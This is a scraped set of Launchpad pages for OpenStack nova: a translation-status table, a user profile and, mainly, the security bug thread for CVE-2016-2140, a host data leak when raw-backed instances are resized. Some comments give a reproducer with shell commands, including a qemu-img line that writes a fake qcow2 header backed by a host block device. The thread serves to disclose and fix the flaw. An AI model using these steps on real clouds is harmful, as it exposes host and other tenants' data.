| [Greek](/nova/trunk/%2Bpots/nova/el/%2Btranslate) | 2 099.87  0.13175230566534915% translated  99.86824769433466% untranslated | 1516 [1516](/nova/trunk/%2Bpots/nova/el/%2Btranslate?show=untranslated) | 0 0 | 2014-04-02 15:56:24 UTC 2014-04-02 |
| [Hebrew](/nova/trunk/%2Bpots/nova/he/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/he/%2Btranslate?show=untranslated) | 0 0 | 2014-03-07 06:39:29 UTC 2014-03-07 |
| [Hindi](/nova/trunk/%2Bpots/nova/hi/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/hi/%2Btranslate?show=untranslated) | 0 0 | 2013-09-09 20:15:29 UTC 2013-09-09 |
| [Hungarian](/nova/trunk/%2Bpots/nova/hu/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/hu/%2Btranslate?show=untranslated) | 0 0 | 2013-06-07 09:16:34 UTC 2013-06-07 |
| [Indonesian](/nova/trunk/%2Bpots/nova/id/%2Btranslate) | 1166 023.19  76.81159420289855% translated  23.18840579710145% untranslated | 352 [352](/nova/trunk/%2Bpots/nova/id/%2Btranslate?show=untranslated) | 4 [4](/nova/trunk/%2Bpots/nova/id/%2Btranslate?show=new_suggestions) | 2013-06-12 06:23:30 UTC 2013-06-12 |
| [Italian](/nova/trunk/%2Bpots/nova/it/%2Btranslate) | 399 073.72  26.284584980237153% translated  73.71541501976284% untranslated | 1119 [1119](/nova/trunk/%2Bpots/nova/it/%2Btranslate?show=untranslated) | 3 [3](/nova/trunk/%2Bpots/nova/it/%2Btranslate?show=new_suggestions) | 2013-04-12 14:24:26 UTC 2013-04-12 |
| [Japanese](/nova/trunk/%2Bpots/nova/ja/%2Btranslate) | 526 065.35  34.65085638998682% translated  65.34914361001317% untranslated | 992 [992](/nova/trunk/%2Bpots/nova/ja/%2Btranslate?show=untranslated) | 4 [4](/nova/trunk/%2Bpots/nova/ja/%2Btranslate?show=new_suggestions) | 2012-06-17 06:26:26 UTC 2012-06-17 |
| [Kabyle](/nova/trunk/%2Bpots/nova/kab/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/kab/%2Btranslate?show=untranslated) | 0 0 | 2020-09-26 09:29:19 UTC 2020-09-26 |
| [Kannada](/nova/trunk/%2Bpots/nova/kn/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/kn/%2Btranslate?show=untranslated) | 0 0 | 2013-10-03 20:33:34 UTC 2013-10-03 |
| [Khmer](/nova/trunk/%2Bpots/nova/km/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/km/%2Btranslate?show=untranslated) | 12 [12](/nova/trunk/%2Bpots/nova/km/%2Btranslate?show=new_suggestions) | 2013-12-05 23:09:30 UTC 2013-12-05 |
| [Korean](/nova/trunk/%2Bpots/nova/ko/%2Btranslate) | 133 091.24  8.761528326745719% translated  91.23847167325428% untranslated | 1385 [1385](/nova/trunk/%2Bpots/nova/ko/%2Btranslate?show=untranslated) | 0 0 | 2012-08-18 04:14:44 UTC 2012-08-18 |
| [Latgalian](/nova/trunk/%2Bpots/nova/ltg/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/ltg/%2Btranslate?show=untranslated) | 1 [1](/nova/trunk/%2Bpots/nova/ltg/%2Btranslate?show=new_suggestions) | 2013-12-03 08:45:58 UTC 2013-12-03 |
| [Latvian](/nova/trunk/%2Bpots/nova/lv/%2Btranslate) | 5 099.67  0.32938076416337286% translated  99.67061923583663% untranslated | 1513 [1513](/nova/trunk/%2Bpots/nova/lv/%2Btranslate?show=untranslated) | 0 0 | 2013-03-07 16:14:28 UTC 2013-03-07 |
| [Malay](/nova/trunk/%2Bpots/nova/ms/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/ms/%2Btranslate?show=untranslated) | 406 [406](/nova/trunk/%2Bpots/nova/ms/%2Btranslate?show=new_suggestions) | 2012-06-13 09:15:03 UTC 2012-06-13 |
| [Mari (Meadow)](/nova/trunk/%2Bpots/nova/mhr/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/mhr/%2Btranslate?show=untranslated) | 3 [3](/nova/trunk/%2Bpots/nova/mhr/%2Btranslate?show=new_suggestions) | 2013-11-05 08:44:17 UTC 2013-11-05 |
| [Nepali](/nova/trunk/%2Bpots/nova/ne/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/ne/%2Btranslate?show=untranslated) | 0 0 | 2013-10-03 20:33:29 UTC 2013-10-03 |
| [Norwegian Bokmal](/nova/trunk/%2Bpots/nova/nb/%2Btranslate) | 74 095.13  4.874835309617918% translated  95.12516469038208% untranslated | 1444 [1444](/nova/trunk/%2Bpots/nova/nb/%2Btranslate?show=untranslated) | 0 0 | 2012-03-13 11:36:56 UTC 2012-03-13 |
| [Occitan (post 1500)](/nova/trunk/%2Bpots/nova/oc/%2Btranslate) | 16 098.95  1.0540184453227932% translated  98.9459815546772% untranslated | 1502 [1502](/nova/trunk/%2Bpots/nova/oc/%2Btranslate?show=untranslated) | 394 [394](/nova/trunk/%2Bpots/nova/oc/%2Btranslate?show=new_suggestions) | 2011-11-17 07:23:06 UTC 2011-11-17 |
| [Persian](/nova/trunk/%2Bpots/nova/fa/%2Btranslate) | 14 099.08  0.922266139657444% translated  99.07773386034255% untranslated | 1504 [1504](/nova/trunk/%2Bpots/nova/fa/%2Btranslate?show=untranslated) | 0 0 | 2012-09-18 11:44:07 UTC 2012-09-18 |
| [Polish](/nova/trunk/%2Bpots/nova/pl/%2Btranslate) | 2 099.87  0.13175230566534915% translated  99.86824769433466% untranslated | 1516 [1516](/nova/trunk/%2Bpots/nova/pl/%2Btranslate?show=untranslated) | 0 0 | 2012-09-04 20:24:42 UTC 2012-09-04 |
| [Portuguese](/nova/trunk/%2Bpots/nova/pt/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/pt/%2Btranslate?show=untranslated) | 8 [8](/nova/trunk/%2Bpots/nova/pt/%2Btranslate?show=new_suggestions) | 2013-06-07 09:16:30 UTC 2013-06-07 |
| [Romanian](/nova/trunk/%2Bpots/nova/ro/%2Btranslate) | 2 099.87  0.13175230566534915% translated  99.86824769433466% untranslated | 1516 [1516](/nova/trunk/%2Bpots/nova/ro/%2Btranslate?show=untranslated) | 4 [4](/nova/trunk/%2Bpots/nova/ro/%2Btranslate?show=new_suggestions) | 2013-03-03 09:38:48 UTC 2013-03-03 |
| [Russian](/nova/trunk/%2Bpots/nova/ru/%2Btranslate) | 1307 013.90  86.10013175230566% translated  13.899868247694336% untranslated | 211 [211](/nova/trunk/%2Bpots/nova/ru/%2Btranslate?show=untranslated) | 15 [15](/nova/trunk/%2Bpots/nova/ru/%2Btranslate?show=new_suggestions) | 2013-05-21 06:50:11 UTC 2013-05-21 |
| [Serbian](/nova/trunk/%2Bpots/nova/sr/%2Btranslate) | 1 099.93  0.06587615283267458% translated  99.93412384716733% untranslated | 1517 [1517](/nova/trunk/%2Bpots/nova/sr/%2Btranslate?show=untranslated) | 0 0 | 2014-04-02 15:56:24 UTC 2014-04-02 |
| [Slovak](/nova/trunk/%2Bpots/nova/sk/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/sk/%2Btranslate?show=untranslated) | 6 [6](/nova/trunk/%2Bpots/nova/sk/%2Btranslate?show=new_suggestions) | 2013-09-09 20:15:25 UTC 2013-09-09 |
| [Spanish](/nova/trunk/%2Bpots/nova/es/%2Btranslate) | 1517 000.07  99.93412384716733% translated  0.06587615283267458% untranslated | 1 [1](/nova/trunk/%2Bpots/nova/es/%2Btranslate?show=untranslated) | 80 [80](/nova/trunk/%2Bpots/nova/es/%2Btranslate?show=new_suggestions) | 2013-07-09 23:15:49 UTC 2013-07-09 |
| [Swedish](/nova/trunk/%2Bpots/nova/sv/%2Btranslate) | 20 098.68  1.3175230566534915% translated  98.68247694334651% untranslated | 1498 [1498](/nova/trunk/%2Bpots/nova/sv/%2Btranslate?show=untranslated) | 1 [1](/nova/trunk/%2Bpots/nova/sv/%2Btranslate?show=new_suggestions) | 2013-01-15 20:08:01 UTC 2013-01-15 |
| [Tagalog](/nova/trunk/%2Bpots/nova/tl/%2Btranslate) | 6 099.60  0.3952569169960474% translated  99.60474308300395% untranslated | 1512 [1512](/nova/trunk/%2Bpots/nova/tl/%2Btranslate?show=untranslated) | 0 0 | 2011-08-23 11:21:43 UTC 2011-08-23 |
| [Tajik](/nova/trunk/%2Bpots/nova/tg/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/tg/%2Btranslate?show=untranslated) | 0 0 | 2020-07-23 06:12:18 UTC 2020-07-23 |
| [Tamil](/nova/trunk/%2Bpots/nova/ta/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/ta/%2Btranslate?show=untranslated) | 0 0 | 2014-04-02 15:56:25 UTC 2014-04-02 |
| [Thai](/nova/trunk/%2Bpots/nova/th/%2Btranslate) | 5 099.67  0.32938076416337286% translated  99.67061923583663% untranslated | 1513 [1513](/nova/trunk/%2Bpots/nova/th/%2Btranslate?show=untranslated) | 0 0 | 2012-05-27 00:06:52 UTC 2012-05-27 |
| [Tibetan](/nova/trunk/%2Bpots/nova/bo/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/bo/%2Btranslate?show=untranslated) | 0 0 | 2019-12-12 01:59:05 UTC 2019-12-12 |
| [Turkish](/nova/trunk/%2Bpots/nova/tr/%2Btranslate) | 28 098.16  1.844532279314888% translated  98.15546772068511% untranslated | 1490 [1490](/nova/trunk/%2Bpots/nova/tr/%2Btranslate?show=untranslated) | 43 [43](/nova/trunk/%2Bpots/nova/tr/%2Btranslate?show=new_suggestions) | 2013-03-14 06:55:20 UTC 2013-03-14 |
| [Ukrainian](/nova/trunk/%2Bpots/nova/uk/%2Btranslate) | 19 098.75  1.251646903820817% translated  98.74835309617919% untranslated | 1499 [1499](/nova/trunk/%2Bpots/nova/uk/%2Btranslate?show=untranslated) | 391 [391](/nova/trunk/%2Bpots/nova/uk/%2Btranslate?show=new_suggestions) | 2011-08-23 11:21:35 UTC 2011-08-23 |
| [Urdu](/nova/trunk/%2Bpots/nova/ur/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/ur/%2Btranslate?show=untranslated) | 0 0 | 2013-12-05 23:09:34 UTC 2013-12-05 |
| [Uyghur](/nova/trunk/%2Bpots/nova/ug/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/ug/%2Btranslate?show=untranslated) | 1 [1](/nova/trunk/%2Bpots/nova/ug/%2Btranslate?show=new_suggestions) | 2012-03-18 09:35:05 UTC 2012-03-18 |

[ [Change your preferred languages...](/%2Beditmylanguages)
—
View all languages
]

![Key to this table: “Unchanged” means](/@@/green-bar)
Translated

![and “untranslated” means just that,](/@@/red-bar)
Untranslated

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from review.openstack.org_0f152391_20250126_124903.html ===




=== Content from answers.launchpad.net_c6f997e5_20250126_124916.html ===

[Log in / Register](https://answers.launchpad.net/nova/%2Blogin)

[![](https://launchpadlibrarian.net/324577028/nova64.png)](https://launchpad.net/nova)

## [OpenStack Compute (nova)](https://launchpad.net/nova)

* [Overview](https://launchpad.net/nova)
* [Code](https://code.launchpad.net/nova)
* [Bugs](https://bugs.launchpad.net/nova)
* [Blueprints](https://blueprints.launchpad.net/nova)
* [Translations](https://translations.launchpad.net/nova)
* Answers

# Questions for OpenStack Compute (nova)

**Launchpad does not know where
OpenStack Compute (nova)
tracks support requests.**

OpenStack Compute (nova) questions are
tracked in:
[nova in Ubuntu](/ubuntu/%2Bsource/nova),
[python-openstack-compute in Ubuntu](/ubuntu/%2Bsource/python-openstack-compute).

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from launchpad.net_9e50c715_20250126_124923.html ===

[Log in / Register](https://launchpad.net/~tristan-cacqueray/%2Blogin)

[![](/@@/person-logo)](https://launchpad.net/~tristan-cacqueray)

## [Tristan Cacqueray](https://launchpad.net/~tristan-cacqueray)

* Overview
* [Code](https://code.launchpad.net/~tristan-cacqueray)
* [Bugs](https://bugs.launchpad.net/~tristan-cacqueray)
* [Blueprints](https://blueprints.launchpad.net/~tristan-cacqueray)
* [Translations](https://translations.launchpad.net/~tristan-cacqueray)
* [Answers](https://answers.launchpad.net/~tristan-cacqueray)

* [Related packages](https://launchpad.net/~tristan-cacqueray/%2Brelated-packages)
* [Related projects](https://launchpad.net/~tristan-cacqueray/%2Brelated-projects)

## User information

Launchpad Id:
tristan-cacqueray

Email:
[Log in](%2Blogin) for email information.

Member since:
2013-10-25

[![Icon of OpenStack Security SIG](https://launchpadlibrarian.net/203991792/os14.png "Member of OpenStack Security SIG")](/~openstack-ossg)

Signed Ubuntu Code of Conduct:
Yes

Languages:

English

OpenPGP keys:

EB103DE8B5E69E631C6FF17922B9A05C925CC5D8

SSH keys:

[localadmin@controller](%2Bsshkeys)

Time zone:

UTC
(UTC+0000)

Karma:
[0](https://launchpad.net/~tristan-cacqueray/%2Bkarma)
[Karma help](/%2Bhelp-registry/karma.html)

Social accounts:
![IRC](/@@/social-irc "IRC")
**tristanC**
 on
**irc.freenode.net**

## [All memberships](https://launchpad.net/~tristan-cacqueray/%2Bparticipation) Latest memberships

| [Swiftsync dev](/~swiftsync-devteam)  Joined on 2014-02-13 | |
| --- | --- |
| [OpenStack Security SIG](/~openstack-ossg)  Joined on 2013-12-12 | |

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from bugs.launchpad.net_f1ac9b35_20250126_124901.html ===

[Log in / Register](https://bugs.launchpad.net/nova/%2Bbug/1548450/%2Blogin)

[![](https://launchpadlibrarian.net/324577028/nova64.png)](https://launchpad.net/nova)

## [OpenStack Compute (nova)](https://launchpad.net/nova)

* [Overview](https://launchpad.net/nova)
* [Code](https://code.launchpad.net/nova)
* [Bugs](https://bugs.launchpad.net/nova)
* [Blueprints](https://blueprints.launchpad.net/nova)
* [Translations](https://translations.launchpad.net/nova)
* [Answers](https://answers.launchpad.net/nova)

# [OSSA 2016-007] Host data leak during resize/migrate for raw-backed instances (CVE-2016-2140)

Bug #1548450 reported by
[Matthew Booth](https://launchpad.net/~mbooth-9)
on 2016-02-22

[18](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [OpenStack Compute (nova)](https://bugs.launchpad.net/nova) | Fix Released | Critical | [Lee Yarwood](https://launchpad.net/~lyarwood) |  |
|  | [Kilo](https://bugs.launchpad.net/nova/kilo) | Fix Released | Critical | [Lee Yarwood](https://launchpad.net/~lyarwood) | [OpenStack Compute (nova) 2015.1.4](https://launchpad.net/nova/%2Bmilestone/2015.1.4) |
|  | [Liberty](https://bugs.launchpad.net/nova/liberty) | Fix Released | Critical | [Lee Yarwood](https://launchpad.net/~lyarwood) |  |
|  | [OpenStack Security Advisory](https://bugs.launchpad.net/ossa) | Fix Released | Critical | Unassigned |  |

### Bug Description

First, a caveat. This report is from code inspection only. I haven't attempted to replicate it, and I have no immediate plans to. It's possible it doesn't exist due to an interaction which isn't immediately obvious.

When resizing an instance using the libvirt driver, we run LibvirtDriver.migrate\_disk\_and\_power\_off on the source host. If there is no shared storage, data is copied. Specifically, there's a loop in that function which loops over disk info:

for info in disk\_info:

                # assume inst\_base == dirname(info['path'])

                ...

                copy the disk

Note that this doesn't copy disk.info, because it's not a disk. I have actually confirmed this whilst investigating another bug.

The problem with this is that disk.info contains file format information, which means that when the instance starts up again, the format of all its disks are re-inspected. This is the bug. It means that a malicious user can write data to an ephemeral or root disk which fakes a qcow2 header, and on re-inspection it will be detected as qcow2 and data from a user-specified backing file will be served.

I am moderately confident that this is a real bug.

Unlike the previous file format bug I reported, though, this bug would be mitigated by the fact that the user would have to access the disk via libvirt/qemu. Assuming they haven't disabled SELinux (nobody does that, right?) this severely limits the data which can be accessed, possibly to the point that it isn't worth exploiting. I also believe it would only be exploitable on deployments using raw storage, which I believe isn't common.

Given that I don't think it's all that serious in practise, I'm not going to work on this immediately as I don't have the time. If it's still around when I'm less busy I'll pick it up.

See [original description](comments/0)

Tags:

[in-stable-liberty](/nova/%2Bbugs?field.tag=in-stable-liberty)
[in-stable-kilo](/nova/%2Bbugs?field.tag=in-stable-kilo)

## CVE References

* [2016-2140](/bugs/cve/2016-2140 "The libvirt driver in OpenStack Compu...")

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2016-02-22

| **description**: | updated |
| --- | --- |
| Changed in ossa: | |
| **status**: | New → Incomplete |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-02-22: |  |  | [#1](/nova/%2Bbug/1548450/comments/1) |
| --- | --- | --- | --- |

Since this report concerns a possible security risk, an incomplete security advisory task has been added while the core security reviewers for the affected project or projects confirm the bug and discuss the scope of any vulnerability along with potential solutions.

So IIRC, the user needs direct access to libvirt/qemu to overwrite the disk with fake qcow2 headers after the instance is migrated and before the disk is re-inspected ?

Since this report concerns a possible security risk, an incomplete security advisory task has been added while the core security reviewers for the affected project or projects confirm the bug and discuss the scope of any vulnerability along with potential solutions.
So IIRC, the user needs direct access to libvirt/qemu to overwrite the disk with fake qcow2 headers after the instance is migrated and before the disk is re-inspected ?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-23: |  |  | [#2](/nova/%2Bbug/1548450/comments/2) |
| --- | --- | --- | --- |

Here's a theoretical reproducer, which \*I HAVE NOT TESTED\*:

A system uses raw files for storage. An unprivileged user creates an instance using a flavour with an ephemeral disk. From within the instance, the user writes a fake qcow2 header to the ephemeral disk with an external backing file. The user resizes the instance. After resize, the user logs in to their instance again. The ephemeral disk now presents the contents of the backing file rather than the fake qcow2 header.

There is a hard requirement here on using the libvirt driver and raw storage. Qcow2 storage isn't vulnerable to this kind of attack, and rbd and lvm both hard code the raw format and don't require inspection. Ploop is just different. I doubt it's vulnerable.

Because the data is accessed from within the instance, it is confined both by unix permissions, and by whatever mechanism confines data accessible by the qemu process. On RHEL OSP this would include SELinux, which I believe would severely limit the impact of this attack.

Here's a theoretical reproducer, which \*I HAVE NOT TESTED\*:
A system uses raw files for storage. An unprivileged user creates an instance using a flavour with an ephemeral disk. From within the instance, the user writes a fake qcow2 header to the ephemeral disk with an external backing file. The user resizes the instance. After resize, the user logs in to their instance again. The ephemeral disk now presents the contents of the backing file rather than the fake qcow2 header.
There is a hard requirement here on using the libvirt driver and raw storage. Qcow2 storage isn't vulnerable to this kind of attack, and rbd and lvm both hard code the raw format and don't require inspection. Ploop is just different. I doubt it's vulnerable.
Because the data is accessed from within the instance, it is confined both by unix permissions, and by whatever mechanism confines data accessible by the qemu process. On RHEL OSP this would include SELinux, which I believe would severely limit the impact of this attack.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Daniel Berrange (berrange)](https://launchpad.net/~berrange) wrote on 2016-02-23: |  |  | [#3](/nova/%2Bbug/1548450/comments/3) |
| --- | --- | --- | --- |

Whether SELinux protects us or not entirely depends on what Nova sets as the disk format in the XML after the resize. If Nova were to tell Libvirt that the disk is qcow2 after the resize, then SELinux will happily grant access to the backing file set in the qcow2 file.

Whether SELinux protects us or not entirely depends on what Nova sets as the disk format in the XML after the resize. If Nova were to tell Libvirt that the disk is qcow2 after the resize, then SELinux will happily grant access to the backing file set in the qcow2 file.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-23: |  |  | [#4](/nova/%2Bbug/1548450/comments/4) |
| --- | --- | --- | --- |

Ah, that would be more serious, then. I can confirm that nova explicitly tells libvirt that the file is qcows.

Ah, that would be more serious, then. I can confirm that nova explicitly tells libvirt that the file is qcows.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-23: |  |  | [#5](/nova/%2Bbug/1548450/comments/5) |
| --- | --- | --- | --- |

To clarify that last: I can confirm that nova would tell libvirt that the file is qcow2 if my understanding of the bug is correct. I still haven't reproduced it.

To clarify that last: I can confirm that nova would tell libvirt that the file is qcow2 if my understanding of the bug is correct. I still haven't reproduced it.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-23: |  |  | [#6](/nova/%2Bbug/1548450/comments/6) |
| --- | --- | --- | --- |

If this is exploitable, it would be interesting to know if libvirt will allow use of a host block device as a backing file. That would be extremely serious.

If this is exploitable, it would be interesting to know if libvirt will allow use of a host block device as a backing file. That would be extremely serious.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-02-23: |  |  | [#7](/nova/%2Bbug/1548450/comments/7) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/nova/%2Bbug/1548450/comments/7/%2Bdownload) (6.7 KiB)

I've been able to reproduce this using a compute host block device as the backing file on RHEL OSP 8 (Liberty). I plan on repeating this with devstack for Mitaka shortly. My notes on this reproducer are below :

- Image and flavor configuration :

# wget <https://download.fedoraproject.org/pub/fedora/linux/releases/23/Cloud/x86_64/Images/Fedora-Cloud-Base-23-20151030.x86_64.qcow2>

# glance image-create --name fedora --file Fedora-Cloud-Base-23-20151030.x86\_64.qcow2 --disk-format qcow2 --container-format bare --progress

# nova flavor-create eph 6 512 5 1 --ephemeral 1

# nova flavor-create eph\_large 7 768 5 1 --ephemeral 1

- Ensure use\_cow\_images is False on all compute hosts :

# openstack-config --get /etc/nova/nova.conf libvirt use\_cow\_images

False

- Boot an instance using the fedora image and a small ephemeral disk :

# nova boot --key-name local --image fedora --ephemeral size=1,format=ext4 --flavor 6 --nic net-id=b41000f6-9de2-4851-a622-2a5786167e83 test-boot

root@host # ps aux | grep qemu

qemu 18725 93.7 9.4 1421432 751232 ? Rl 14:00 6:47 /usr/libexec/qemu-kvm -name instance-00000005 -S -machine pc-i440fx-rhel7.2.0,accel=tcg,usb=off -m 512 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid d56b9bf3-f3b0-4d76-952b-5015b43babcd -smbios type=1,manufacturer=Red Hat,product=OpenStack Compute,version=12.0.1-6.el7ost,serial=c512dcd1-48bb-644c-9794-82f056d85a95,uuid=d56b9bf3-f3b0-4d76-952b-5015b43babcd,family=Virtual Machine -no-user-config -nodefaults -chardev socket,id=charmonitor,path=/var/lib/libvirt/qemu/domain-instance-00000005/monitor.sock,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc -no-shutdown -boot strict=on -device piix3-usb-uhci,id=usb,bus=pci.0,addr=0x1.0x2 -drive file=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk,if=none,id=drive-virtio-disk0,format=raw,cache=none -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk.eph0,if=none,id=drive-virtio-disk1,format=raw,cache=none -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x5,drive=drive-virtio-disk1,id=virtio-disk1 -netdev tap,fd=26,id=hostnet0 -device virtio-net-pci,netdev=hostnet0,id=net0,mac=fa:16:3e:32:1c:23,bus=pci.0,addr=0x3 -chardev file,id=charserial0,path=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/console.log -device isa-serial,chardev=charserial0,id=serial0 -chardev pty,id=charserial1 -device isa-serial,chardev=charserial1,id=serial1 -device usb-tablet,id=input0 -vnc 0.0.0.0:0 -k en-us -device cirrus-vga,id=video0,bus=pci.0,addr=0x2 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x6 -msg timestamp=on

- Confirm the block layout within the guest and umount the formatted ephemeral disk :

root@guest # lsblk

NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT

vda 252:0 0 5G 0 disk

└─vda1 252:1 0 5G 0 part /

vdb 252:16 0 1G 0 disk /mnt

root@guest # umount /mnt

- Use qemu-img to write a qcow2 header to the device using a physical device on the host as a backing file :

root@guest # qemu-img create -f qcow2 -o backing\_file=/dev/sda3,backi...

[Read more...](/nova/%2Bbug/1548450/comments/7)

I've been able to reproduce this using a compute host block device as the backing file on RHEL OSP 8 (Liberty). I plan on repeating this with devstack for Mitaka shortly. My notes on this reproducer are below :
- Image and flavor configuration :
# wget https://download.fedoraproject.org/pub/fedora/linux/releases/23/Cloud/x86\_64/Images/Fedora-Cloud-Base-23-20151030.x86\_64.qcow2
# glance image-create --name fedora --file Fedora-Cloud-Base-23-20151030.x86\_64.qcow2 --disk-format qcow2 --container-format bare --progress
# nova flavor-create eph 6 512 5 1 --ephemeral 1
# nova flavor-create eph\_large 7 768 5 1 --ephemeral 1
- Ensure use\_cow\_images is False on all compute hosts :
# openstack-config --get /etc/nova/nova.conf libvirt use\_cow\_images
False
- Boot an instance using the fedora image and a small ephemeral disk :
# nova boot --key-name local --image fedora --ephemeral size=1,format=ext4 --flavor 6 --nic net-id=b41000f6-9de2-4851-a622-2a5786167e83 test-boot
root@host # ps aux | grep qemu
qemu 18725 93.7 9.4 1421432 751232 ? Rl 14:00 6:47 /usr/libexec/qemu-kvm -name instance-00000005 -S -machine pc-i440fx-rhel7.2.0,accel=tcg,usb=off -m 512 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid d56b9bf3-f3b0-4d76-952b-5015b43babcd -smbios type=1,manufacturer=Red Hat,product=OpenStack Compute,version=12.0.1-6.el7ost,serial=c512dcd1-48bb-644c-9794-82f056d85a95,uuid=d56b9bf3-f3b0-4d76-952b-5015b43babcd,family=Virtual Machine -no-user-config -nodefaults -chardev socket,id=charmonitor,path=/var/lib/libvirt/qemu/domain-instance-00000005/monitor.sock,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc -no-shutdown -boot strict=on -device piix3-usb-uhci,id=usb,bus=pci.0,addr=0x1.0x2 -drive file=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk,if=none,id=drive-virtio-disk0,format=raw,cache=none -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk.eph0,if=none,id=drive-virtio-disk1,format=raw,cache=none -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x5,drive=drive-virtio-disk1,id=virtio-disk1 -netdev tap,fd=26,id=hostnet0 -device virtio-net-pci,netdev=hostnet0,id=net0,mac=fa:16:3e:32:1c:23,bus=pci.0,addr=0x3 -chardev file,id=charserial0,path=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/console.log -device isa-serial,chardev=charserial0,id=serial0 -chardev pty,id=charserial1 -device isa-serial,chardev=charserial1,id=serial1 -device usb-tablet,id=input0 -vnc 0.0.0.0:0 -k en-us -device cirrus-vga,id=video0,bus=pci.0,addr=0x2 -device 